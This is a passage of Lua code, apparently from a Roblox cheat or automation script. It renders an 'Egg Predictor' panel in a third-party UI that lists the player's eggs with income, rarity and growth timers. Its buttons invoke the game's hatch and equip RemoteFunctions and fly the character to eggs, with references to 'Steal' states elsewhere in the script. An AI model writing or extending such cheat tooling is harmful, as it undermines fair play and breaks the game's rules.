local tbl24 = { 0.78, Color3.fromRGB(158, 166, 182) }
local tbl25 = { 1, Color3.fromRGB(250, 252, 255) }
tbl19[1] = tbl20
tbl19[2] = tbl21
tbl19[3] = tbl22
tbl19[4] = tbl23
tbl19[5] = tbl24
tbl19[6] = tbl25
tbl12.SecretGradient = sequence2(tbl19)
tbl12.SecretRotation = 90
tbl12.Paint = function(arg, arg2)
return string.format("<font color=\"%s\">%s</font>", arg, arg2)
end
tbl12.Bold = function(arg)
return "<b>" .. tostring(arg) .. "</b>"
end
tbl12.Escape = function(arg)
return (string.gsub(tostring(arg), "[<>&]", { ["<"] = "&lt;", [">"] = "&gt;", ["&"] = "&amp;" }))
end
tbl12.Separator = function()
return tbl12.Paint(tbl12.Color.Separator, "  " .. tbl12.Bullet .. "  ")
end
tbl12.FormatRate = function(arg)
local n13 = tonumber(arg) or 0
if n13 >= 1e12 then
return string.format("%.2fT/s", n13 / 1e12)
end
if n13 >= 1e9 then
return string.format("%.2fB/s", n13 / 1e9)
end
if n13 >= 1000000 then
return string.format("%.2fM/s", n13 / 1000000)
end
if n13 >= 1000 then
return string.format("%.1fK/s", n13 / 1000)
end
return string.format("%d/s", math.floor(n13))
end
tbl12.FormatWeight = function(arg)
local n13 = tonumber(arg) or 0
local str = n13 >= 1000 and string.format("%.0f", n13) or string.format("%.2f", n13)
local v13, v14 = string.match(str, "^(%-?%d+)(%.%d+)$")
str = v13 or str
local v15
while true do
local v16
v15, v16 = string.gsub(str, "^(%-?%d+)(%d%d%d)", "%1,%2")
if v16 ~= 0 then
str = v15
else
break
end
end
return v15 .. (v14 or "") .. " Kg"
end
tbl12.FormatClock = function(arg)
local n13 = math.max(0, math.floor(tonumber(arg) or 0))
return string.format("%02dh %02dm %02ds", math.floor(n13 / 3600), math.floor(n13 % 3600 / 60), n13 % 60)
end
tbl12.ScaleFactor = function(arg)
if arg > 5 then
return (arg / 5) ^ 1.2 * 19.637875755794113
end
return arg ^ 1.85
end
tbl12.MutationMultiplier = function(arg)
arg = type(arg) == "table" and arg or {}
local mutations = tbl.Mutations
if type(mutations) == "table" and type(mutations.EarningsFor) == "function" then
local ok, result = pcall(mutations.EarningsFor, arg)
if ok and type(result) == "number" then
return result
end
end
return 1
end
local tbl26 = {
Golden = "#FFD34D",
Silver = "#E6EEF7",
Sakura = "#FF9ED8",
GreatBloom = "#7CFFC4",
Boss = "#FF7A7A",
Monstrous = "#C08BFF",
}
local tbl27 = { "#FF6B6B", "#FFB36B", "#FFF06B", "#6BFF8A", "#6BC8FF", "#B96BFF" }
tbl12.MutationText = function(arg)
local tbl28 = {}
if type(arg) == "table" then
for _, v13 in ipairs(arg) do
local v14 = string.upper(fn7(v13))
if v13 == "Rainbow" or v13 == "Prismatic" then
local tbl29 = {}
for i = 1, #v14 do
table.insert(tbl29, tbl12.Paint(tbl27[(i - 1) % #tbl27 + 1], string.sub(v14, i, i)))
end
local insert = table.insert
local v15 = table.pack(tbl12.Bold(table.concat(tbl29)))
insert(tbl28, table.unpack(v15, 1, v15.n))
else
table.insert(tbl28, tbl12.Bold(tbl12.Paint(tbl26[v13] or "#8FE3FF", tbl12.Escape(v14))))
end
end
end
return table.concat(tbl28, " ")
end
local rarityGradients = nil
local function fn16(arg)
if type(arg) == "table" and typeof(arg.RarityGradient) == "Instance" then
return arg.RarityGradient
end
if rarityGradients == nil then
local assets = ReplicatedStorage:FindFirstChild("Assets")
assets = assets and assets:FindFirstChild("UI")
rarityGradients = assets and assets:FindFirstChild("RarityGradients") or false
end
if not rarityGradients or type(arg) ~= "table" then
return nil
end
local v13 = rarityGradients:FindFirstChild(tostring(arg._id or arg.DisplayName or ""))
return v13 and v13:FindFirstChild("RarityGradient") or nil
end
local tbl28 = {}
tbl12.AssetInfo = function(arg)
local category = tostring(arg)
local v13 = tbl28[category]
if v13 then
return v13
end
local directory = tbl.Assets and tbl.Assets.Directory
local flag2 = type(directory) == "table" and directory[category] or nil
if flag2 == nil and type(directory) == "table" then
local v14 = string.gsub(string.lower(category), "[^%a%d]", "")
for k, v15 in pairs(directory) do
if type(v15) == "table" then
local tbl29 = {}
local str = tostring(k)
local str2 = tostring(v15._id or "")
local v16 = tostring
local displayName = v15.DisplayName or ""
local v17 = table.pack(v16(displayName))
tbl29[1] = str
tbl29[2] = str2
do
local values = table.pack(table.unpack(v17, 1, v17.n))
table.move(values, 1, values.n, 3, tbl29)
end
local egg = type(v15.Egg) == "table" and v15.Egg or nil
if egg ~= nil then
tbl29[#tbl29 + 1] = tostring(egg.ModelName or "")
end
for _, v18 in ipairs(tbl29) do
if v18 ~= "" and string.gsub(string.lower(v18), "[^%a%d]", "") == v14 then
flag2 = v15
break
end
end
end
if flag2 == nil then
continue
end
break
end
end
local rarity = type(flag2) == "table" and type(flag2.Rarity) == "table" and flag2.Rarity or nil
local icon = type(flag2) == "table" and flag2.Icon or nil
local rarity2
if rarity then
rarity2 = tostring(rarity.DisplayName or rarity._id or "Common")
else
rarity2 = rarity
end
rarity2 = rarity2 or "Common"
local color3 = rarity and typeof(rarity.Color) == "Color3" and rarity.Color or Color3.fromRGB(255, 255, 255)
local tbl29 = {}
local name = type(flag2) == "table"
if name then
name = tostring(flag2.DisplayName or category)
end
tbl29.Name = name or category
tbl29.Category = category
tbl29.Rarity = rarity2
local rarityNumber
if rarity then
rarityNumber = tonumber(rarity.RarityNumber or rarity.Rank)
else
rarityNumber = rarity
end
tbl29.RarityNumber = rarityNumber or 0
tbl29.Color = color3
tbl29.Hex = "#" .. string.upper(color3:ToHex())
tbl29.Gradient = fn16(rarity)
tbl29.EarningRate = type(flag2) == "table" and tonumber(flag2.EarningRate) or 0
tbl29.Icon = type(icon) == "string" and icon ~= "" and icon or nil
tbl28[category] = tbl29
return tbl29
end
tbl12.Income = function(arg, arg2, arg3)
if type(arg2) ~= "number" or arg2 <= 0 then
return 0
end
return math.max(math.round(arg.EarningRate * tbl12.ScaleFactor(arg2) * tbl12.MutationMultiplier(arg3)), 1)
end
local function isShown(arg)
if typeof(arg) ~= "Instance" or not arg:IsDescendantOf(game) then
return false
end
while arg do
if arg:IsA("GuiObject") and not arg.Visible then
return false
end
if arg:IsA("LayerCollector") then
return arg.Enabled
end
arg = arg.Parent
end
return false
end
tbl12.PageVisible = function()
local ok, result = pcall(function()
return v11.Page
end)
if not ok or typeof(result) ~= "Instance" then
return true
end
return isShown(result) and result.AbsoluteSize.X > 0
end
tbl12.IsShown = isShown
local tbl29 = { "Value", "Rarity", "Time Left" }
local tbl30 = {
{ Key = "Ready", Title = "READY TO HATCH", Color = tbl12.Color.Ready },
{ Key = "Growing", Title = "GROWING", Color = tbl12.Color.Growing },
{ Key = "Inventory", Title = "IN INVENTORY", Color = tbl12.Color.Inventory },
}
local n13 = 1
local paint2 = tbl12.Paint
local bold2 = tbl12.Bold
local color3 = tbl12.Color
local tbl31 = { Sort = tbl29[1], Spotlight = true }
local id = nil
local n14 = 0.0909
local v13 = nil
local tbl32 = {}
local tbl33 = {}
local tbl34 = {}
local tbl35 = {}
local n15 = 0
local n16 = 0
local n17 = 0.06
local n18 = -1
local n19 = -1
local n20 = -1
local n21 = 4
local n22 = 3
local flag2 = false
local n23 = 0
local flag3 = true
local n24 = 0
local flag4 = false
local v14 = nil
local function requestEggRefresh()
flag3 = true
end
local function fn17(arg)
if not arg or arg.DiffWrapped then
return arg
end
local set = arg.Set
arg.DiffWrapped = true
arg.Set = function(arg2)
if type(arg2) ~= "table" then
return set(arg2)
end
local spec = arg.Spec
local tbl36 = nil
for k, v15 in pairs(arg2) do
if spec[k] ~= v15 then
tbl36 = tbl36 or {}
tbl36[k] = v15
end
end
if tbl36 then
set(tbl36)
end
return arg
end
return arg
end
local function fn18(arg, arg2)
local v15 = string.gsub(tostring(arg.Spec.Text or ""), "%d", "0")
return tostring(n16) .. "|" .. tostring(arg2) .. "|" .. v15
end
local function fn19(arg, arg2)
local eggRecords = tbl.EggRecords
if type(eggRecords) ~= "table" or type(eggRecords.GrowthSecondsRemaining) ~= "function" then
return 0, 0
end
local n25 = 1
if type(eggRecords.GrowthSpeedMultiplier) == "function" then
local ok, result = pcall(eggRecords.GrowthSpeedMultiplier, arg)
ok = ok and type(result) == "number"
local n26 = 1
if ok then
n25 = result
else
n25 = n26
end
end
local ok, result = pcall(eggRecords.GrowthSecondsRemaining, arg, arg2, n25)
ok = ok and type(result) == "number"
local n26 = 0
if not ok then
result = n26
end
local n27 = 0
if type(eggRecords.GrowthDuration) == "function" then
local ok2
ok2, n27 = pcall(eggRecords.GrowthDuration, arg)
ok2 = ok2 and type(n27) == "number"
local n28 = 0
if not ok2 then
n27 = n28
end
end
return result, n27
end
local function fn20(arg)
local eggRecords = tbl.EggRecords
if type(eggRecords) == "table" and type(eggRecords.WeightKg) == "function" then
local ok, result = pcall(eggRecords.WeightKg, arg)
if ok and type(result) == "number" then
return result
end
end
return 0
end
local function fn21()
local eggState = tbl.EggState
if type(eggState) ~= "table" or type(eggState.ReadOwnerEggs) ~= "function" then
return nil
end
local ok, result = pcall(eggState.ReadOwnerEggs, localPlayer.UserId)
if not ok or type(result) ~= "table" then
return nil
end
local serverTimeNow = workspace:GetServerTimeNow()
local tbl36 = {}
for k, v15 in pairs(result) do
if type(v15) == "table" then
local v16 = tbl12.AssetInfo(v15.AssetCategory)
local n25 = tonumber(v15.AssetScale) or 0
local mutations = type(v15.Mutations) == "table" and v15.Mutations or {}
local tbl37 = {
Id = k,
Info = v16,
Scale = n25,
Weight = fn20(v15),
Mutations = mutations,
Income = tbl12.Income(v16, n25, mutations),
Status = "Inventory",
Remaining = math.huge,
Percent = 0,
}
if v15.Placement ~= nil then
local ok2, result2 = pcall(eggState.IsReadyToHatch, k)
if ok2 and result2 then
tbl37.Status = "Ready"
tbl37.Remaining = 0
tbl37.Percent = 100
else
local v17, v18 = fn19(v15, serverTimeNow)
tbl37.Status = "Growing"
tbl37.Remaining = v17
if v18 > 0 then
tbl37.Percent = math.clamp(math.floor((1 - v17 / v18) * 100), 0, 100)
end
end
end
table.insert(tbl36, tbl37)
end
end
return tbl36
end
local function fn22(arg)
local sort = tbl31.Sort
table.sort(arg, function(arg2, arg3)
if sort == tbl29[2] and arg2.Info.RarityNumber ~= arg3.Info.RarityNumber then
return arg2.Info.RarityNumber > arg3.Info.RarityNumber
end
if sort == tbl29[3] and arg2.Remaining ~= arg3.Remaining then
return arg2.Remaining < arg3.Remaining
end
return arg2.Income > arg3.Income
end)
end
local function fn23(arg)
if arg.Status == "Ready" then
return bold2(paint2(color3.Ready, "Ready to hatch"))
end
if arg.Status == "Growing" then
return bold2(paint2(color3.Clock, tbl12.FormatClock(arg.Remaining))) .. tbl12.Separator() .. paint2(color3.Growing, arg.Percent .. "%")
end
return paint2(color3.Inventory, "In inventory")
end
local function fn24(arg)
local tbl36 = {}
local v15 = tbl12.MutationText(arg.Mutations)
table.insert(tbl36, bold2(paint2(color3.Income, tbl12.FormatRate(arg.Income))))
table.insert(tbl36, paint2(color3.Scale, string.format("%.2fx", arg.Scale)))
table.insert(tbl36, paint2(color3.Weight, tbl12.FormatWeight(arg.Weight)))
if v15 ~= "" then
table.insert(tbl36, v15)
end
return table.concat(tbl36, tbl12.Separator())
end
local n25 = 5
local n26 = n25 + 0.8
local n27 = 1.2
local n28 = 1.2
local n29 = 0.936
local n30 = 2.3
local n31 = 0.25
local n32 = 0.18
local n33 = n30 + 0.6
local n34 = 0.24
local n35 = 0.22
local function fn25(arg)
if string.upper(tostring(arg.Rarity)) == "SECRET" then
return tbl12.SecretGradient
end
return arg.Gradient
end
local function fn26(arg)
return fn25(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
end
local function fn27(arg)
if string.upper(tostring(arg.Rarity)) == "SECRET" then
return tbl12.SecretRotation
end
return nil
end
local function fn28(arg)
local v15 = arg and arg.Get()
if not v15 or n16 <= 0 then
return nil
end
if v15.Text ~= tostring(arg.Spec.Text or "") then
return nil
end
return v15
end
local function fn29(arg)
local v15 = fn18(arg, "w")
if arg.WidthKey == v15 then
return arg.WidthUnits
end
local v16 = fn28(arg)
if not v16 then
return nil
end
local size = v16.Size
local textWrapped = v16.TextWrapped
v16.TextWrapped = false
v16.Size = UDim2.fromOffset(100000, math.max(1, size.Y.Offset))
local x = v16.TextBounds.X
v16.Size = size
v16.TextWrapped = textWrapped
if x <= 0 then
return nil
end
local widthUnits = x / n16
arg.WidthKey = v15
arg.WidthUnits = widthUnits
return arg.WidthUnits
end
local function fn30(arg, arg2)
local v15 = fn18(arg, math.floor(arg2 * 100 + 0.5))
if arg.HeightKey == v15 then
return arg.HeightUnits
end
local v16 = fn28(arg)
if not v16 then
return nil
end
local size = v16.Size
v16.Size = UDim2.fromOffset(math.max(1, math.floor(arg2 * n16 + 0.5)), 100000)
local y = v16.TextBounds.Y
v16.Size = size
if y <= 0 then
return nil
end
local heightUnits = y / n16
arg.HeightKey = v15
arg.HeightUnits = heightUnits
return arg.HeightUnits
end
local function fn31(arg)
local rfEggWorldAskHatch = networking:FindFirstChild("RF/EggWorld/AskHatch")
if not rfEggWorldAskHatch or not rfEggWorldAskHatch:IsA("RemoteFunction") then
return false
end
local ok, result = pcall(rfEggWorldAskHatch.InvokeServer, rfEggWorldAskHatch, arg)
if not ok or result == false then
return false
end
task.wait(0.35)
local rfEggWorldAskFinishHatch = networking:FindFirstChild("RF/EggWorld/AskFinishHatch")
if rfEggWorldAskFinishHatch and rfEggWorldAskFinishHatch:IsA("RemoteFunction") then
pcall(rfEggWorldAskFinishHatch.InvokeServer, rfEggWorldAskFinishHatch, arg)
end
return true
end
tbl32.RunAction = function()
local focus = tbl32.Focus
if type(focus) ~= "table" or focus.Id == nil then
return
end
local str = tostring(focus.Id)
if focus.Status == "Inventory" then
local eggState = tbl.EggState
if type(eggState) == "table" and type(eggState.WearEggTool) == "function" and pcall(eggState.WearEggTool, str) then
return
end
local rfEggWorldAskWearTool = networking:FindFirstChild("RF/EggWorld/AskWearTool")
if rfEggWorldAskWearTool and rfEggWorldAskWearTool:IsA("RemoteFunction") then
pcall(rfEggWorldAskWearTool.InvokeServer, rfEggWorldAskWearTool, str)
end
return
end
if focus.Status == "Ready" then
if not tbl32.Hatching then
tbl32.Hatching = true
pcall(fn31, str)
tbl32.Hatching = false
end
return
end
if tbl32.Flying or type(tbl4.FlyTo) ~= "function" then
return
end
local placedEggRenders = workspace:FindFirstChild("PlacedEggRenders")
local v15 = nil
if placedEggRenders then
for _, child in ipairs(placedEggRenders:GetChildren()) do
if string.find(child.Name, str, 1, true) or child:GetAttribute("Uid") == str then
v15 = child
break
end
end
end
if not v15 then
return
end
local ok, result = pcall(function()
return v15:IsA("Model") and v15:GetPivot() or v15.CFrame
end)
if not ok then
return
end
local movement = tbl4.Movement
if movement.Owner ~= nil and movement.Owner ~= "treadmill" or movement.PlaceWanted or tbl4.Steal.Active or tbl4.Steal.Wanted or tbl4.Steal.Carrying then
return
end
tbl32.Flying = true
if tbl4.ClaimMovement("predictor") then
if tbl4.Treadmill.Riding or tbl4.OnBelt() then
pcall(tbl4.ExitBelt)
end
pcall(tbl4.FlyTo, result.Position + Vector3.new(0, 3, 0), function()
return false
end, "fly")
tbl4.ReleaseMovement("predictor")
end
tbl32.Flying = false
end
local function fn32(arg)
v13 = arg
arg:SetDock(5, { Gap = n35, DividerColor = Color3.fromRGB(170, 174, 184) })
local v15 = arg:Dock()
tbl32.Icon = arg:Image({
Parent = v15,
X = 0,
Y = 0,
Width = n25,
Height = n25,
Corner = 0.35,
Background = "#000000",
BackgroundTransparency = 0.26,
StrokeThickness = n14,
StrokeTransparency = 0,
ZIndex = 8,
})
tbl32.Name = arg:Text({
Parent = v15,
X = n26,
Y = 0,
Height = n27,
Scale = n28,
Wrap = false,
Gradient = tbl12.NameGradient,
TextStrokeTransparency = 1,
ZIndex = 9,
})
tbl32.Rarity = arg:Text({
Parent = v15,
X = n26,
Y = 0,
Height = n27,
Scale = n29,
Wrap = false,
Font = tbl12.RarityFont,
TextStrokeTransparency = 1,
StrokeTransparency = 0.08,
ZIndex = 9,
})
tbl32.Info = arg:Text({ Parent = v15, X = n26, Y = n27, Height = n25 - n27, Wrap = false, ZIndex = 9 })
tbl32.Action = arg:Button({
Parent = v15,
X = 0,
Y = 0,
Width = 5,
Height = n27 - 0.1,
Text = "",
Scale = 1,
Background = "#000000",
BackgroundTransparency = 0.55,
HoverTransparency = 0.3,
PressTransparency = 0.15,
Corner = 0.35,
StrokeColor = Color3.fromRGB(255, 255, 255),
StrokeThickness = n14,
StrokeTransparency = 0.6,
Visible = false,
ZIndex = 10,
Callback = function()
if type(tbl32.RunAction) == "function" then
task.spawn(tbl32.RunAction)
end
end,
})
arg:OnResize(function(arg2, arg3, arg4)
if arg3 == n18 and arg4 == n19 then
return
end
n18 = arg3
n19 = arg4
n15 = arg3 / math.max(arg4, 1)
n16 = arg4
n23 = 2
n17 = 0.9 / math.max(arg:TextSize(), 1)
tbl32.Rarity.Set({ StrokeThickness = n17 })
for _, v16 in ipairs(tbl33) do
v16.Rarity.Set({ StrokeThickness = n17 })
end
end)
for _, v16 in ipairs({ "Icon", "Name", "Rarity", "Info", "Action" }) do
fn17(tbl32[v16])
end
end
local function fn33(arg)
local v15 = tbl34[arg]
if not v15 then
local v16 = v13:Text({ Name = "Line", X = 0, Y = 0, Width = 1, Height = 1, Wrap = true, Visible = false })
tbl34[arg] = fn17(v16)
v15 = v16
end
return v15
end
local function fn34(arg)
local v15 = tbl33[arg]
if v15 then
return v15
end
local tbl36 = {}
tbl36.Frame = v13:Button({
Name = "Entry",
Text = "",
Background = "#000000",
BackgroundTransparency = 0.74,
HoverTransparency = 0.46,
PressTransparency = 0.3,
Corner = 0.35,
X = 0,
Y = 0,
Width = 1,
Height = 1,
Visible = false,
Callback = function()
if tbl36.Id ~= nil then
id = tbl36.Id
requestEggRefresh()
end
end,
})
tbl36.Icon = v13:Image({
Parent = tbl36.Frame,
X = n31,
Y = 0,
Width = n30,
Height = n30,
Corner = 0.35,
Background = "#000000",
BackgroundTransparency = 0.255,
StrokeThickness = n14,
StrokeTransparency = 0,
})
tbl36.Name = v13:Text({
Parent = tbl36.Frame,
X = n31 + n33,
Y = 0,
Width = 1,
Height = n27,
Scale = n28,
Wrap = false,
Gradient = tbl12.NameGradient,
TextStrokeTransparency = 1,
})
tbl36.Rarity = v13:Text({
Parent = tbl36.Frame,
X = n31 + n33,
Y = 0,
Width = 1,
Height = n27,
Scale = n29,
Wrap = false,
Font = tbl12.RarityFont,
TextStrokeTransparency = 1,
StrokeTransparency = 0.08,
StrokeThickness = n17,
})
tbl36.Detail = v13:Text({
Parent = tbl36.Frame,
X = n31 + n33,
Y = n27,
Width = math.max(1, n15 - n33 - n31 * 2),
Height = 1,
Wrap = true,
})
tbl36.Status = v13:Text({ Parent = tbl36.Frame, X = 0, Y = 0, Width = 1, Height = n27, Wrap = false, Align = "Right" })
for _, v16 in ipairs({ "Frame", "Icon", "Name", "Rarity", "Detail", "Status" }) do
fn17(tbl36[v16])
end
tbl33[arg] = tbl36
return tbl36
end
local function fn35(arg)
local tbl36 = { Ready = 0, Growing = 0, Inventory = 0 }
local n36 = 0
local v15 = nil
for _, v16 in ipairs(arg) do
local status = v16.Status
tbl36[status] = tbl36[status] + 1
n36 += v16.Income
if not v15 or v16.Income > v15.Income then
v15 = v16
end
end
return bold2(paint2(color3.Text, tostring(#arg) .. " eggs")) .. tbl12.Separator() .. bold2(paint2(color3.Ready, tbl36.Ready .. " ready")) .. tbl12.Separator() .. bold2(paint2(color3.Growing, tbl36.Growing .. " growing")) .. tbl12.Separator() .. bold2(paint2(color3.Inventory, tbl36.Inventory .. " in bag")) .. tbl12.Separator() .. paint2(color3.Text, "Total") .. " " .. bold2(paint2(color3.Income, tbl12.FormatRate(n36))), v15
end
local function fn36(arg, arg2)
if arg2 == "" then
return true
end
local str = " " .. arg.Status
local v15 = string.lower(tostring(arg.Info.Name) .. " " .. tostring(arg.Info.Rarity) .. str)
for _, mutation in ipairs(arg.Mutations) do
v15 ..= " " .. string.lower(tostring(mutation))
end
return string.find(v15, arg2, 1, true) ~= nil
end
local function fn37(arg)
local tbl36 = {}
local v15 = bold2(paint2(color3.Income, tbl12.FormatRate(arg.Income)))
local str = paint2(color3.Scale, string.format("%.2fx", arg.Scale)) .. tbl12.Separator() .. paint2(color3.Weight, tbl12.FormatWeight(arg.Weight))
tbl36[1] = v15
tbl36[2] = str
do
local values = table.pack(fn23(arg))
table.move(values, 1, values.n, 3, tbl36)
end
local v16 = tbl12.MutationText(arg.Mutations)
table.insert(tbl36, v16 ~= "" and v16 or paint2(color3.Hint, "Tap an egg below to preview it"))
return table.concat(tbl36, "\n")
end
local function fn38(arg)
local flag5 = tbl31.Spotlight and arg ~= nil
if v14 ~= flag5 then
v14 = flag5
v13:SetDock(flag5 and 5 or 0, { Gap = n35 })
end
tbl32.Icon.Set({ Visible = flag5 })
tbl32.Name.Set({ Visible = flag5 })
tbl32.Rarity.Set({ Visible = flag5 })
tbl32.Info.Set({ Visible = flag5 })
tbl32.Action.Set({ Visible = flag5 })
tbl32.Focus = flag5 and arg or nil
if not flag5 then
return
end
local info = arg.Info
tbl32.Action.Set({
Text = arg.Status == "Inventory" and bold2(paint2(color3.Inventory, "Hold egg")) or arg.Status == "Ready" and bold2(paint2(color3.Ready, "Hatch egg")) or bold2(paint2(color3.Growing, "Fly to egg")),
})
tbl32.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
tbl32.Name.Set({ Text = tbl12.Escape(info.Name) })
tbl32.Rarity.Set({
Text = string.upper(tostring(info.Rarity)),
Color = fn26(info),
Gradient = fn25(info),
GradientRotation = fn27(info),
})
tbl32.Info.Set({ Text = fn37(arg) })
end
local function fn39(arg, arg2)
local info = arg2.Info
arg.Id = arg2.Id
arg.Frame.Set({ Visible = true, BackgroundTransparency = arg2.Id == id and 0.12 or 0.74 })
arg.Icon.Set({ Visible = info.Icon ~= nil, Image = info.Icon or "", StrokeColor = info.Color })
arg.Name.Set({ Text = tbl12.Escape(info.Name) })
arg.Rarity.Set({
Text = string.upper(tostring(info.Rarity)),
Color = fn26(info),
Gradient = fn25(info),
GradientRotation = fn27(info),
})
arg.Detail.Set({ Text = fn24(arg2) })
arg.Status.Set({ Text = fn23(arg2) })
end
local function fn40()
if n15 <= 0 then
return
end
flag2 = false
local n36 = math.max(1, n15 - n26)
local v15 = fn29(tbl32.Action)
if v15 then
tbl32.ActionUnits = v15 + 1.4
else
flag2 = true
end
local n37 = math.min(tbl32.ActionUnits or 5, n36 * 0.45)
local n38 = math.max(1, n36 - n37 - n34)
tbl32.Action.Set({ X = n15 - n37, Y = 0.05, Width = n37, Height = n27 - 0.1 })
local v16 = fn29(tbl32.Rarity)
if v16 then
n22 = v16 + 0.1
else
flag2 = true
end
local v17 = fn29(tbl32.Name)
if v17 then
n21 = math.min(v17 + 0.1, math.max(1, n38 - n22 - n34))
else
flag2 = true
end
tbl32.Name.Set({ X = n26, Y = 0, Width = n21, Height = n27 })
tbl32.Rarity.Set({
X = n26 + n21 + n34,
Y = 0,
Width = math.max(0.5, math.min(n22, n38 - n21 - n34)),
Height = n27,
})
tbl32.Info.Set({ X = n26, Y = n27, Width = n36, Height = math.max(1, n25 - n27) })
local n39 = math.max(1, n15 - n33 - n31 * 2)
local n40 = 0
for _, v18 in ipairs(tbl35) do
if v18.Kind == "text" then
local handle = v18.Handle
local v19 = fn30(handle, n15)
if v19 then
v18.Height = v19
else
flag2 = true
end
local n41 = math.max(1, v18.Height or 1)
handle.Set({ X = 0, Y = n40 + (v18.Gap and 0.5 or 0), Width = n15, Height = n41 })
n40 += n41 + n35 * 0.5 + (v18.Gap and 0.5 or 0)
else
local item = v18.Item
local v19 = fn30(item.Detail, n39)
if v19 then
item.DetailUnits = v19
else
flag2 = true
end
local n41 = math.clamp(item.DetailUnits or 1, 1, 4)
local v20 = fn29(item.Status)
if v20 then
item.StatusUnits = v20 + 0.23
else
flag2 = true
end
local n42 = math.min(n39 * 0.42, math.max(2.73, item.StatusUnits or 2.73))
local n43 = math.max(1, n39 - n42 - n34)
local v21 = fn29(item.Rarity)
if v21 then
item.RarityUnits = v21 + 0.1
else
flag2 = true
end
local n44 = math.min(item.RarityUnits or 3, n43 * 0.5)
local v22 = fn29(item.Name)
if v22 then
item.NameUnits = v22 + 0.1
else
flag2 = true
end
local min = math.min
local max = math.max
local nameUnits = item.NameUnits or 4
local max2 = math.max
local n45 = n43 - n44 - n34
local v23 = min(max(1, nameUnits), max2(1, n45))
local n46 = n32 * 2
local n47 = math.max(n41 + n27, 2.3) + n46
local n48 = (n47 - n41 - n27) / 2
item.Frame.Set({ X = 0, Y = n40, Width = n15, Height = n47 })
item.Icon.Set({ Y = (n47 - n30) / 2 })
item.Name.Set({ X = n31 + n33, Y = n48, Width = v23 })
item.Rarity.Set({ X = n31 + n33 + v23 + n34, Y = n48, Width = math.max(0.5, n44) })
item.Detail.Set({ X = n31 + n33, Y = n48 + n27, Width = n39, Height = n41 })
item.Status.Set({
Visible = v18.HasStatus,
X = n31 + n33 + n39 - n42,
Y = n48,
Width = math.max(0.5, n42),
})
n40 += n47 + n35
end
end
local n41 = math.max(1, n40)
if math.abs(n41 - n20) > 0.01 then
n20 = n41
v13:SetContentLines(n41)
end
end
local function fn41()
if not v13 then
return
end
n23 = 2
local v15 = fn21()
table.clear(tbl35)
local n36 = 0
local function fn42(arg, arg2)
n36 += 1
local v16 = fn33(n36)
v16.Set({ Visible = true, Text = arg })
table.insert(tbl35, { Kind = "text", Handle = v16, Gap = arg2 })
end
local n37
if not v15 then
fn38(nil)
fn42(bold2(paint2(color3.Hint, "Egg data is not available yet")), false)
n37 = 0
else
fn22(v15)
local v16, v17 = fn35(v15)
fn42(v16, false)
local v18 = nil
if id ~= nil then
v18 = nil
for _, v19 in ipairs(v15) do
if v19.Id == id then
v18 = v19
break
else
v18 = nil
end
end
end
fn38(v18 or v17)
local v19 = string.lower(v13:Query())
local tbl36 = {}
for _, v20 in ipairs(v15) do
if fn36(v20, v19) then
table.insert(tbl36, v20)
end
end
if #tbl36 == 0 then
fn42(paint2(color3.Hint, #v15 == 0 and "No eggs yet" or string.format("No results for \"%s\"", tbl12.Escape(v19))), false)
n37 = 0
else
n37 = 0
for _, v20 in ipairs(tbl30) do
local tbl37 = {}
for _, v21 in ipairs(tbl36) do
if v21.Status == v20.Key then
table.insert(tbl37, v21)
end
end
if #tbl37 > 0 then
local flag5 = #tbl35 > 0
fn42(string.format("<b><font color=\"%s\">%s</font></b> <font color=\"#AAAAAA\">(%d)</font>", v20.Color, v20.Title, #tbl37), flag5)
for _, v21 in ipairs(tbl37) do
n37 += 1
local v22 = fn34(n37)
fn39(v22, v21)
table.insert(tbl35, { Kind = "item", Item = v22, HasStatus = true })
end
end
end
end
end
for i = n36 + 1, #tbl34 do
tbl34[i].Set({ Visible = false })
end
for i = n37 + 1, #tbl33 do
tbl33[i].Frame.Set({ Visible = false })
end
fn40()
n23 = 2
end
tbl12.RequestEggRefresh = requestEggRefresh
if not tbl12.Ready then
v12:CreateText({ Name = "Egg Predictor", Text = "Predictor preview card needs a canvas-capable Virex UI." })
else
v12:CreateDropdown({
Name = "Sort By",
Options = tbl29,
Default = tbl29[1],
Callback = function(sort)
if table.find(tbl29, sort) then
tbl31.Sort = sort
requestEggRefresh()
end
end,
})
v12:CreateToggle({
Name = "Preview Card",
Default = true,
Callback = function(arg)
tbl31.Spotlight = arg == true
requestEggRefresh()
end,
})
local v15 = v12:CreateCanvas({
Name = "Egg Predictor",
Search = true,
SearchPlaceholder = "Search eggs...",
Layout = "free",
Style = {
TextScale = 0.84,
LineHeight = 1.1,
MinLines = 16,
MaxLines = 32,
BackgroundTransparency = 0.5,
ScrollBarColor = Color3.fromRGB(170, 174, 184),
TextColor = Color3.fromRGB(255, 255, 255),
TextStrokeTransparency = 0.7,
},
Build = function(arg)
fn32(arg)
requestEggRefresh()
end,
})
fn4(function()
v15:Destroy()
end)
local connection = RunService.Heartbeat:Connect(function(deltaTime)
local v16 = tbl12.PageVisible()
local flag5 = v16 and (v13 == nil or tbl12.IsShown(v13:Root()))
if flag5 and not flag4 then
flag3 = true
end
flag4 = flag5
if not v16 then
return
end
n24 += deltaTime
if flag5 and flag3 or n24 >= n13 then
n24 = 0
if flag5 then
flag3 = false
pcall(fn41)
end
if tbl12.RefreshFuse then
pcall(tbl12.RefreshFuse)
end
end
if flag5 and (n23 > 0 or flag2) then
if n23 > 0 then
n23 -= 1
end
pcall(fn40)
end
if tbl12.PlaceFuse then
tbl12.PlaceFuse()
end
end)
fn4(function()
connection:Disconnect()
end)
end
paint = tbl12.Paint
bold = tbl12.Bold
color = tbl12.Color
local n36 = 5
local n37 = n36 + 0.8
local n38 = 1.2
local n39 = 1.2
local n40 = 0.936
local n41 = 2.3
local n42 = 0.25
local n43 = 0.18
local n44 = n41 + 0.6
local n45 = 0.24
n2 = 0.22
local n46 = 0.0909
v10 = nil
tbl13 = {}
tbl14 = {}
tbl15 = {}
tbl16 = {}
local n47 = 0
local n48 = 0
local n49 = 0.06
local n50 = -1
local n51 = -1
local n52 = -1
local n53 = 4
local n54 = 3
flag = false
n3 = 0
fn8 = function(arg)
if string.upper(tostring(arg.Rarity)) == "SECRET" then
return tbl12.SecretGradient
end
return arg.Gradient
end
fn9 = function(arg)
return fn8(arg) ~= nil and Color3.fromRGB(255, 255, 255) or arg.Color
end
fn10 = function(arg)
if string.upper(tostring(arg.Rarity)) == "SECRET" then
return tbl12.SecretRotation
end
return nil
end
fn11 = function(arg)
v10 = arg
